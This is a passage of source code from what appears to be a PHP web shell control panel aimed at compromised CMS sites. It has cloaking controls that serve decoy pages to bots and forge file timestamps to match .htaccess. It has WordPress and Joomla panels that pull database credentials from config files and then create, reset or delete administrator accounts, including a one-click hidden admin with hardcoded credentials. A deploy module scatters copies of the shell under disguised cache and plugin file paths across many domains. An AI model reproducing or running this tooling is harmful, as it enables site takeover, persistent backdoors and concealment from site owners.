function clkBt(){clkMsg('clkMsg','Bot test...','info');document.getElementById('clkRa').style.display='none';var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=botcheck&_='+Date.now());x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.error){clkMsg('clkMsg',r.error,'err');return;}var h='HTTP: '+r.http_code+' | Cloak: '+(r.cloak_active?'ACTIVE':'DISABLED')+'<br>Match: '+(r.matched?'<span style=color:#22c55e>Decoy served</span>':'<span style=color:#f59e0b>Decoy not served (expected)</span>');document.getElementById('clkRa').innerHTML=h;document.getElementById('clkRa').style.display='block';clkMsg('clkMsg','','');}catch(e){clkMsg('clkMsg','Error','err');}};x.send();}
function clkCc(){clkMsg('clkMsg','Clearing cache...','info');document.getElementById('clkRa').style.display='none';var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=clearcache&_='+Date.now());x.timeout=20000;x.onload=function(){try{var r=JSON.parse(x.responseText);var h='';for(var k in r)h+='<div style="padding:4px 8px;background:rgba(34,197,94,.05);border-left:3px solid #22c55e;color:#22c55e;font-size:11px;margin:2px 0;border-radius:0 4px 4px 0;">'+k+': '+r[k]+'</div>';document.getElementById('clkRa').innerHTML=h;document.getElementById('clkRa').style.display='block';clkMsg('clkMsg','','');}catch(e){clkMsg('clkMsg','JSON error','err');}};x.ontimeout=function(){clkMsg('clkMsg','Timed out','err');};x.send();}
function clkFts(){clkMsg('clkMsg','Timestamp...','info');var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=fixts&_='+Date.now());x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.s==='ok')clkMsg('clkMsg',r.n+' files set to .htaccess timestamp ('+r.t+')','ok');else clkMsg('clkMsg',r.m,'err');}catch(e){clkMsg('clkMsg','Error','err');}};x.send();}
function clkCht(){clkMsg('clkMsg','Cleaning .htaccess...','info');var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=cleanht&_='+Date.now());x.onload=function(){clkMsg('clkMsg','.htaccess: '+x.responseText,x.responseText==='OK'?'ok':'info');setTimeout(function(){location.reload()},1500);};x.send();}
function clkLp(){var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=viewperde&_='+Date.now());x.onload=function(){if(x.status==200&&x.responseText){document.getElementById('clkPh').value=x.responseText;clkMsg('clkPmsg','Decoy loaded ('+x.responseText.length+' characters)','ok');}else clkMsg('clkPmsg','Decoy not found','err');};x.send();}
function clkToH(s){var b=new TextEncoder().encode(s),h='';for(var i=0;i<b.length;i++)h+=('0'+b[i].toString(16)).slice(-2);return h;}
function clkSp(){var c=document.getElementById('clkPh').value;if(c.indexOf('<')===-1){clkMsg('clkPmsg','HTML required','err');return;}clkMsg('clkPmsg','Saving...','info');var fd=new FormData();fd.append('a','savehtml');fd.append('d',clkToH(c));var x=new XMLHttpRequest();x.open('POST','?'+CK+'&_='+Date.now());x.onload=function(){clkMsg('clkPmsg',x.responseText==='OK'?'Saved!':'Error: '+x.responseText,x.responseText==='OK'?'ok':'err');};x.send(fd);}
function clkUg(){var n=document.getElementById('clkGn').value.trim(),c=document.getElementById('clkGc').value.trim();if(!/^google[a-zA-Z0-9]+\.html$/.test(n)){clkMsg('clkGm','Invalid file name','err');return;}if(!/^google-site-verification:\s*[A-Za-z0-9_\-\.]+\s*$/.test(c)){clkMsg('clkGm','Invalid content','err');return;}clkMsg('clkGm','Uploading...','info');var fd=new FormData();fd.append('a','writegoogle');fd.append('b',btoa(n).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''));fd.append('d',clkToH(c));var x=new XMLHttpRequest();x.open('POST','?'+CK+'&_='+Date.now());x.onload=function(){if(x.responseText==='OK'){clkMsg('clkGm','Uploaded!','ok');setTimeout(function(){location.reload()},1000);}else clkMsg('clkGm','Error: '+x.responseText,'err');};x.send(fd);}
function clkRmG(n){if(!confirm('Delete '+n+'?'))return;var b=btoa(n).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=rmgoogle&b='+b+'&_='+Date.now());x.onload=function(){if(x.responseText==='OK')location.reload();};x.send();}
</script>
</div>
<?php elseif ($page === 'wpadmin'): ?>
<?php
$wdb = wpConnect();
$wdbError = !$wdb ? 'wp-config.php not found or DB connection failed.' : null;
$admins = null;
$wSiteInfo = null;
if ($wdb) {
    $m = $wdb['mysqli']; $tp = $wdb['prefix'];
    $tu = $tp . 'users'; $tm = $tp . 'usermeta';
    $admins = $m->query("SELECT u.ID, u.user_login, u.user_email, m.meta_value as caps FROM `$tu` u LEFT JOIN `$tm` m ON u.ID = m.user_id AND m.meta_key = '{$tp}capabilities' WHERE m.meta_value LIKE '%administrator%' OR u.ID = 1");
    $wRoot = dirname($wdb['config']);
    $wAdmin = cmsAdminUrl($wRoot, 'WordPress');
    $wSiteInfo = array('root' => $wRoot, 'admin' => $wAdmin);
}
?>
<div class="page-header">
    <h1 class="page-title"><i class="fab fa-wordpress" style="color:#fff;margin-right:10px;"></i> WP Admin Panel</h1>
</div>

<?php if ($wdbError): ?>
<div class="card" style="padding:30px;text-align:center;">
    <i class="fas fa-exclamation-triangle" style="font-size:36px;color:#ef4444;margin-bottom:12px;display:block;"></i>
    <p style="color:#ef4444;font-size:14px;"><?php echo htmlspecialchars($wdbError); ?></p>
    <p style="color:var(--text-ter);font-size:12px;margin-top:8px;">Place this file in the WordPress root or check the file path.</p>
</div>
<?php else: ?>

<div id="wpMsg" style="margin-bottom:12px;"></div>

<div class="card" style="padding:16px 20px;margin-bottom:14px;display:flex;flex-wrap:wrap;gap:18px;align-items:center;">
    <div style="display:flex;flex-direction:column;gap:4px;min-width:200px;">
        <span style="font-size:11px;color:var(--text-ter);text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Site URL</span>
        <span style="font-size:13px;color:var(--text);font-family:'JetBrains Mono',monospace;word-break:break-all;">
            <?php
            $wSiteUrl = isset($wSiteInfo['admin']['opt']['siteurl']) && $wSiteInfo['admin']['opt']['siteurl'] ? $wSiteInfo['admin']['opt']['siteurl'] : (isset($wSiteInfo['admin']['opt']['home']) && $wSiteInfo['admin']['opt']['home'] ? $wSiteInfo['admin']['opt']['home'] : '');
            echo $wSiteUrl ? htmlspecialchars($wSiteUrl) : '<span style="color:var(--text-ter);">wp-config.php (missing)</span>';
            ?>
        </span>
    </div>
    <div style="display:flex;flex-direction:column;gap:4px;min-width:200px;">
        <span style="font-size:11px;color:var(--text-ter);text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Root</span>
        <span style="font-size:12px;color:var(--text-sec);font-family:'JetBrains Mono',monospace;word-break:break-all;"><?php echo htmlspecialchars($wSiteInfo['root']); ?></span>
    </div>
    <?php if (isset($wSiteInfo['admin']['opt']['prefix'])): ?>
    <div style="display:flex;flex-direction:column;gap:4px;">
        <span style="font-size:11px;color:var(--text-ter);text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Prefix</span>
        <span style="font-size:13px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($wSiteInfo['admin']['opt']['prefix']); ?></span>
    </div>
    <?php endif; ?>
    <?php if (isset($wSiteInfo['admin']['path']) && $wSiteInfo['admin']['path']): ?>
    <div style="margin-left:auto;">
        <a href="<?php echo htmlspecialchars(rtrim($wSiteUrl, '/') . '/' . $wSiteInfo['admin']['path']); ?>" target="_blank" rel="noopener" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.25);border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;font-weight:600;transition:all .15s;" onmouseover="this.style.background='rgba(59,130,246,0.2)'" onmouseout="this.style.background='rgba(59,130,246,0.1)'">
            <i class="fas fa-user-shield"></i> Open Admin Panel
        </a>
    </div>
    <?php endif; ?>
</div>

<div class="card" style="padding:0;overflow:hidden;">
<div style="padding:14px 20px;border-bottom:1px solid var(--card-border);font-size:14px;font-weight:600;color:var(--text);">Existing Admins</div>
<table style="width:100%;border-collapse:collapse;font-size:13px;">
<thead><tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">ID</th>
    <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Username</th>
    <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Email</th>
    <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Action</th>
</tr></thead>
<tbody>
<?php if ($admins): while($a = $admins->fetch_object()): ?>
<tr style="border-bottom:1px solid var(--card-border);" onmouseover="this.style.background='rgba(255,255,255,0.02)'" onmouseout="this.style.background='transparent'">
    <td style="padding:10px 16px;color:var(--text-sec);"><?php echo $a->ID; ?></td>
    <td style="padding:10px 16px;color:var(--text);font-weight:500;"><?php echo htmlspecialchars($a->user_login); ?></td>
    <td style="padding:10px 16px;color:var(--text-sec);font-size:12px;"><?php echo htmlspecialchars($a->user_email); ?></td>
    <td style="padding:10px 16px;">
        <form method="post" style="display:inline-flex;align-items:center;gap:6px;" onsubmit="event.preventDefault();wpAction(this);">
            <input type="hidden" name="wa" value="sifirla">
            <input type="hidden" name="id" value="<?php echo $a->ID; ?>">
            <input type="text" name="sifre" placeholder="New password" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:5px 8px;border-radius:6px;font-size:12px;width:120px;outline:none;">
            <button type="submit" style="background:#f59e0b;color:#fff;border:none;padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">Reset</button>
        </form>
        <?php if ($a->ID != 1): ?>
        <form method="post" style="display:inline;margin-left:6px;" onsubmit="event.preventDefault();if(confirm('Are you sure you want to delete?'))wpAction(this);">
            <input type="hidden" name="wa" value="sil">
            <input type="hidden" name="id" value="<?php echo $a->ID; ?>">
            <button type="submit" style="background:#ef4444;color:#fff;border:none;padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">Delete</button>
        </form>
        <?php endif; ?>
    </td>
</tr>
<?php endwhile; endif; ?>
</tbody>
</table>
</div>

<div class="card" style="margin-top:14px;">
<div style="font-size:14px;font-weight:600;color:var(--text);margin:0 0 14px;">Add New Admin</div>
<form method="post" onsubmit="event.preventDefault();wpAction(this);">
    <input type="hidden" name="wa" value="ekle">
    <div style="display:flex;gap:8px;flex-wrap:wrap;">
        <input type="text" name="kadi" placeholder="Username" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:140px;outline:none;">
        <input type="email" name="mail" placeholder="Email" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:140px;outline:none;">
        <input type="text" name="sifre2" placeholder="Password" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:120px;outline:none;">
        <button type="submit" style="background:#22c55e;color:#fff;border:none;padding:8px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;">Add</button>
    </div>
</form>
</div>

<div style="margin-top:14px;padding:16px 20px;background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.18);border-radius:10px;">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
        <i class="fas fa-bolt" style="color:#22c55e;font-size:13px;"></i>
        <span style="font-size:13px;font-weight:600;color:var(--text);">One-Click Admin (WordPress)</span>
        <span style="font-size:10px;color:var(--text-ter);margin-left:6px;">sysadmin / Panel2025!</span>
    </div>
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
        <form method="post" onsubmit="event.preventDefault();wpAction(this);">
            <input type="hidden" name="wa" value="hizli">
            <button type="submit" style="background:#22c55e;color:#fff;border:none;padding:8px 20px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:6px;"><i class="fas fa-user-plus"></i> Create / Update sysadmin</button>
        </form>
        <?php if (isset($wSiteInfo['admin']['base']) && $wSiteInfo['admin']['base']): ?>
        <a href="<?php echo htmlspecialchars(rtrim($wSiteInfo['admin']['base'], '/') . '/wp-admin/'); ?>" target="_blank" rel="noopener" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.25);border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;font-weight:600;"><i class="fas fa-external-link-alt"></i> Open Admin Panel</a>
        <?php endif; ?>
    </div>
</div>

<div style="margin-top:14px;padding:10px 16px;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:8px;font-size:12px;color:#ef4444;">
    <i class="fas fa-exclamation-triangle" style="margin-right:6px;"></i> <strong>WARNING:</strong> Delete this page or restrict access when you're done.
</div>

<?php endif; ?>
<script>
function wpAction(form) {
    var fd = new FormData(form);
    var msg = document.getElementById('wpMsg');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '?page=wpadmin', true);
    xhr.onload = function() {
        msg.innerHTML = xhr.responseText;
        setTimeout(function(){ location.reload(); }, 1500);
    };
    xhr.send(fd);
}
</script>
<?php elseif ($page === 'jmadmin'): ?>
<?php
$jRoots = jmFindDomains();
?>
<div class="page-header">
    <h1 class="page-title"><i class="fab fa-joomla" style="color:#F44321;margin-right:10px;"></i> Joomla Admin Panel</h1>
</div>
<div id="jmMsg" style="margin-bottom:12px;"></div>
<?php if (!$jRoots): ?>
<div class="card" style="padding:30px;text-align:center;">
    <i class="fab fa-joomla" style="font-size:36px;color:#F44321;margin-bottom:12px;display:block;"></i>
    <p style="color:#ef4444;font-size:14px;">No Joomla installation found.</p>
    <p style="color:var(--text-ter);font-size:12px;margin-top:8px;">Searches Joomla root folders for configuration.php + administrator directory.</p>
</div>
<?php else: ?>
<?php foreach ($jRoots as $jr):
    $jDet = detectCMS($jr['root']);
    $jA = cmsAdminUrl($jr['root'], 'Joomla');
    $jBase = $jA['base'];
    $jVer = ($jDet && isset($jDet['version']) && $jDet['version']) ? $jDet['version'] : '';
    $jAdmins = null; $jDbErr = null; $jPrefix = ''; $jSiteUrl = '';
    $jrRoot = rtrim($jr['root'], '/');
    $jCfgFile = $jrRoot . '/configuration.php';
    if (is_file($jCfgFile)) {
        $jCfg = @file_get_contents($jCfgFile);
        $jGet = function($re) use ($jCfg) {
            if (preg_match('/' . $re . '\s*=\s*[\'"]([^\'"]*)[\'"]/', $jCfg, $jM)) return $jM[1];
            return null;
        };
        $jPrefixTmp = $jGet('\\$dbprefix'); if (!$jPrefixTmp) $jPrefixTmp = 'jos_';
        $jPrefix = $jPrefixTmp;
        if (preg_match('/\\\$live_site\s*=\s*["\']([^"\']*)/', $jCfg, $jM2) && !empty($jM2[1])) $jSiteUrl = rtrim($jM2[1], '/');
        $jHost = $jGet('\\$host'); $jUser = $jGet('\\$user'); $jPass = $jGet('\\$password'); $jDb = $jGet('\\$db');
        if (!class_exists('mysqli', false)) {
            $jDbErr = 'mysqli database support not installed.';
        } else {
            $jm = @new mysqli($jHost, $jUser, $jPass, $jDb);
            if ($jm->connect_errno) {
            $jDbErr = 'Failed to connect to Joomla database. (' . $jm->connect_error . ')';
        } else {
            $ju = $jPrefixTmp . 'users'; $jug = $jPrefixTmp . 'user_usergroup_map';
            $rq = $jm->query("SELECT u.id, u.name, u.username, u.email, u.block FROM `$ju` u INNER JOIN `$jug` g ON u.id = g.user_id WHERE g.group_id = 8 ORDER BY u.id");
            if ($rq) {
                $jAdmins = array();
                while ($rr = $rq->fetch_object()) $jAdmins[] = $rr;
            } else {
                $jDbErr = 'Super User query failed (' . $jm->error . ')';
            }
            $jm->close();
        }
    }
    } else {
        $jDbErr = 'configuration.php not found.';
    }
?>
<div class="card" style="padding:0;overflow:hidden;margin-bottom:18px;">
    <div style="padding:14px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;border-bottom:1px solid var(--card-border);">
        <i class="fab fa-joomla" style="color:#F44321;font-size:18px;"></i>
        <span style="font-size:15px;font-weight:700;color:var(--text);"><?php echo htmlspecialchars($jr['name']); ?></span>
        <?php if ($jVer): ?><span style="font-size:11px;color:#fff;padding:2px 10px;background:rgba(244,67,33,.15);border:1px solid rgba(244,67,33,.35);border-radius:12px;font-weight:600;">v<?php echo htmlspecialchars($jVer); ?></span><?php endif; ?>
        <?php if (!$jr['writable']): ?>
        <span style="font-size:10px;color:#ef4444;padding:2px 8px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:12px;">NOT WRITABLE</span>
        <?php endif; ?>
        <div style="margin-left:auto;display:flex;align-items:center;gap:8px;">
            <?php if ($jBase): ?>
            <a href="<?php echo htmlspecialchars(rtrim($jBase, '/') . '/administrator/'); ?>" target="_blank" rel="noopener" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.25);border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;font-weight:600;transition:all .15s;" onmouseover="this.style.background='rgba(59,130,246,0.2)'" onmouseout="this.style.background='rgba(59,130,246,0.1)'"><i class="fas fa-user-shield"></i> Open Admin Panel</a>
            <?php endif; ?>
        </div>
    </div>
    <div style="padding:12px 20px;display:flex;gap:18px;flex-wrap:wrap;border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
        <div style="display:flex;flex-direction:column;gap:4px;min-width:200px;">
            <span style="font-size:11px;color:var(--text-ter);text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Site URL</span>
            <span style="font-size:12px;color:var(--text);font-family:'JetBrains Mono',monospace;word-break:break-all;"><?php echo $jSiteUrl ? htmlspecialchars($jSiteUrl) : '<span style="color:var(--text-ter);">live_site missing</span>'; ?></span>
        </div>
        <div style="display:flex;flex-direction:column;gap:4px;min-width:200px;">
            <span style="font-size:11px;color:var(--text-ter);text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Root</span>
            <span style="font-size:12px;color:var(--text-sec);font-family:'JetBrains Mono',monospace;word-break:break-all;"><?php echo htmlspecialchars($jrRoot); ?></span>
        </div>
        <?php if ($jPrefix): ?>
        <div style="display:flex;flex-direction:column;gap:4px;">
            <span style="font-size:11px;color:var(--text-ter);text-transform:uppercase;letter-spacing:.5px;font-weight:600;">DB Prefix</span>
            <span style="font-size:13px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($jPrefix); ?></span>
        </div>
        <?php endif; ?>
    </div>

    <?php if ($jDbErr): ?>
    <div style="padding:16px 20px;display:flex;align-items:center;gap:8px;color:#ef4444;font-size:13px;">
        <i class="fas fa-exclamation-triangle"></i> <?php echo htmlspecialchars($jDbErr); ?>
    </div>
    <?php else: ?>

    <div style="padding:14px 20px;border-bottom:1px solid var(--card-border);font-size:14px;font-weight:600;color:var(--text);">Existing Super Users
        <?php if ($jAdmins): ?><span style="font-size:11px;color:var(--text-ter);font-weight:400;margin-left:6px;"><?php echo count($jAdmins); ?> accounts</span><?php endif; ?>
    </div>
    <table style="width:100%;border-collapse:collapse;font-size:13px;">
    <thead><tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
        <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">ID</th>
        <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Name</th>
        <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Username</th>
        <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Email</th>
        <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Status</th>
        <th style="padding:10px 16px;text-align:left;color:var(--text-sec);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;">Action</th>
    </tr></thead>
    <tbody>
    <?php if ($jAdmins): foreach ($jAdmins as $ja2): ?>
    <tr style="border-bottom:1px solid var(--card-border);" onmouseover="this.style.background='rgba(255,255,255,0.02)'" onmouseout="this.style.background='transparent'">
        <td style="padding:10px 16px;color:var(--text-sec);"><?php echo $ja2->id; ?></td>
        <td style="padding:10px 16px;color:var(--text);font-weight:500;"><?php echo htmlspecialchars($ja2->name); ?></td>
        <td style="padding:10px 16px;color:var(--text);"><?php echo htmlspecialchars($ja2->username); ?></td>
        <td style="padding:10px 16px;color:var(--text-sec);font-size:12px;"><?php echo htmlspecialchars($ja2->email); ?></td>
        <td style="padding:10px 16px;">
            <?php if ((int)$ja2->block === 1): ?>
            <span style="font-size:10px;color:#ef4444;padding:2px 8px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:12px;">BLOCKED</span>
            <?php else: ?>
            <span style="font-size:10px;color:#22c55e;padding:2px 8px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:12px;">ACTIVE</span>
            <?php endif; ?>
        </td>
        <td style="padding:10px 16px;">
            <form method="post" style="display:inline-flex;align-items:center;gap:6px;" onsubmit="event.preventDefault();jmAction(this);">
                <input type="hidden" name="ja" value="sifirla">
                <input type="hidden" name="root" value="<?php echo htmlspecialchars($jrRoot); ?>">
                <input type="hidden" name="id" value="<?php echo $ja2->id; ?>">
                <input type="text" name="sifre" placeholder="New password" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:5px 8px;border-radius:6px;font-size:12px;width:110px;outline:none;">
                <button type="submit" style="background:#f59e0b;color:#fff;border:none;padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">Reset</button>
            </form>
            <?php if ((int)$ja2->id !== 1): ?>
            <form method="post" style="display:inline;margin-left:6px;" onsubmit="event.preventDefault();if(confirm('Are you sure you want to delete this user?'))jmAction(this);">
                <input type="hidden" name="ja" value="sil">
                <input type="hidden" name="root" value="<?php echo htmlspecialchars($jrRoot); ?>">
                <input type="hidden" name="id" value="<?php echo $ja2->id; ?>">
                <button type="submit" style="background:#ef4444;color:#fff;border:none;padding:5px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">Delete</button>
            </form>
            <?php endif; ?>
        </td>
    </tr>
    <?php endforeach; else: ?>
    <tr><td colspan="6" style="padding:16px;color:var(--text-ter);text-align:center;">No Super User found.</td></tr>
    <?php endif; ?>
    </tbody>
    </table>

    <div style="padding:14px 20px;border-top:1px solid var(--card-border);">
        <div style="font-size:14px;font-weight:600;color:var(--text);margin:0 0 12px;">Add New Super User</div>
        <form method="post" onsubmit="event.preventDefault();jmAction(this);">
            <input type="hidden" name="ja" value="ekle">
            <input type="hidden" name="root" value="<?php echo htmlspecialchars($jrRoot); ?>">
            <div style="display:flex;gap:8px;flex-wrap:wrap;">
                <input type="text" name="ad" placeholder="Full Name" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:140px;outline:none;">
                <input type="text" name="kadi" placeholder="Username" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:130px;outline:none;">
                <input type="email" name="mail" placeholder="Email" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:140px;outline:none;">
                <input type="text" name="sifre" placeholder="Password" required style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;flex:1;min-width:120px;outline:none;">
                <button type="submit" style="background:#22c55e;color:#fff;border:none;padding:8px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;">Add</button>
            </div>
        </form>
    </div>

    <div style="padding:14px 20px;background:rgba(34,197,94,.05);border-top:1px solid rgba(34,197,94,.15);display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
        <i class="fas fa-bolt" style="color:#22c55e;font-size:13px;"></i>
        <span style="font-size:13px;font-weight:600;color:var(--text);">One-Click Admin</span>
        <span style="font-size:10px;color:var(--text-ter);">sysadmin / Panel2025!</span>
        <div style="margin-left:auto;display:flex;gap:8px;">
            <form method="post" onsubmit="event.preventDefault();jmAction(this);">
                <input type="hidden" name="ja" value="hizli">
                <input type="hidden" name="root" value="<?php echo htmlspecialchars($jrRoot); ?>">
                <button type="submit" style="background:#22c55e;color:#fff;border:none;padding:8px 20px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:6px;"><i class="fas fa-user-plus"></i> Create / Update sysadmin</button>
            </form>
            <?php if ($jBase): ?>
            <a href="<?php echo htmlspecialchars(rtrim($jBase, '/') . '/administrator/'); ?>" target="_blank" rel="noopener" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.25);border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;font-weight:600;"><i class="fas fa-external-link-alt"></i> Open Admin Panel</a>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
</div>
<?php endforeach; ?>
<?php endif; ?>
<script>
function jmAction(form) {
    var fd = new FormData(form);
    var msg = document.getElementById('jmMsg');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '?page=jmadmin', true);
    xhr.onload = function() {
        msg.innerHTML = xhr.responseText;
        setTimeout(function(){ location.reload(); }, 1500);
    };
    xhr.send(fd);
}
</script>
<?php elseif ($page === 'propagate'): ?>
<div class="page-header">
    <h1 class="page-title"><i class="fas fa-rocket" style="color:var(--text);margin-right:10px;"></i> Deploy</h1>
    <div style="display:flex;align-items:center;gap:8px;margin-left:auto;">
        <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text-sec);cursor:pointer;">
            <input type="checkbox" id="prAutoRefresh" style="accent-color:var(--text);" onchange="prToggleAutoRefresh()">
            <i class="fas fa-sync-alt"></i> Auto Refresh
        </label>
    </div>
</div>

<div id="prMsg" style="margin-bottom:12px;"></div>

<div class="card" style="padding:14px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
    <input type="text" id="prNote" placeholder="Note (optional)" style="background:var(--bg);border:1px solid var(--card-border);color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;width:200px;outline:none;">
    <button class="btn btn-accent" onclick="prDeployAll()" id="prBtnAll"><i class="fas fa-rocket"></i> Deploy All</button>
    <button class="btn" onclick="prBulkDeploy()" id="prBtnBulk" style="display:none;"><i class="fas fa-layer-group"></i> Deploy Selected</button>
    <button class="btn btn-danger" onclick="prBulkRemove()" id="prBtnBulkRm" style="display:none;"><i class="fas fa-trash"></i> Remove Selected</button>
    <span id="prSelectedCount" style="font-size:12px;color:var(--text-sec);display:none;"></span>
</div>

<div id="prFilters" style="margin-top:12px;display:flex;gap:6px;flex-wrap:wrap;"></div>

<div id="prResults" style="margin-top:14px;">
    <div class="card" style="text-align:center;padding:40px;">
        <i class="fas fa-search" style="font-size:36px;color:var(--text-ter);margin-bottom:12px;display:block;opacity:0.3;"></i>
        <p style="color:var(--text-sec);font-size:14px;">Scanning domains...</p>
    </div>
</div>

<div id="prLogPanel" style="margin-top:20px;">
    <div class="card" style="padding:14px 20px;">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
            <span style="font-size:13px;font-weight:600;color:var(--text);"><i class="fas fa-history"></i> Activity Log</span>
            <button class="btn btn-sm" onclick="prClearLog()" style="font-size:11px;"><i class="fas fa-broom"></i> Clear</button>
        </div>
        <div id="prLogContent" style="font-size:12px;color:var(--text-sec);max-height:200px;overflow-y:auto;">
            <p style="color:var(--text-ter);">No records</p>
        </div>
    </div>
</div>

<script>
var prData = [];
var prFilter = 'all';
var prAutoTimer = null;
var prPaths = {
    wp: ['wp-content/uploads/cache.php','wp-content/uploads/cache/object-cache.php','wp-content/uploads/2024/sunrise.php','wp-content/uploads/media/db.php','wp-content/uploads/backup/wp-cache-config.php','wp-content/upgrade/advanced-cache.php','wp-content/upgrade/temp/force-ssl-admin.php','wp-content/mu-plugins/sunrise.php','wp-content/languages/plugins/akismet.php','wp-content/advanced-cache.php'],
    joomla: ['cache/com_content/model.php','cache/modules/helper.php','cache/system/system.php','cache/view.php','media/system/js/loader.php','media/system/css/style.php','media/jui/css/bootstrap.php','media/jui/js/bootstrap.php','tmp/install/helper.php','tmp/cache.php'],
    laravel: ['storage/framework/cache.php','storage/framework/views/compile.php','storage/framework/sessions/sess.php','storage/framework/events/event.php','storage/logs/log.php','storage/app/app.php','storage/app/public/storage.php','storage/debugbar/debug.php','public/index.php','bootstrap/cache/compile.php'],
    drupal: ['sites/default/files/default.php','sites/default/files/css/css.php','sites/default/files/js/js.php','sites/default/files/images/img.php','sites/default/files/videos/vid.php','sites/default/files/pictures/pic.php','sites/default/files/field/field.php','sites/default/files/ctools/ctools.php','sites/default/files/apachesolr/solr.php','tmp/cache.php'],
    generic: ['tmp/index.php','cache/index.php','uploads/index.php','storage/index.php','public/index.php','data/index.php','temp/index.php','var/index.php','backup/index.php','logs/index.php']
};

function prApi(mode, params, cb) {
    var url = '?page=cloak&a=pr&m=' + encodeURIComponent(mode);
    if (params) { for (var k in params) url += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(params[k]); }
    url += '&_=' + Date.now();
    var x = new XMLHttpRequest();
    x.open('GET', url, true);
    x.onload = function() {
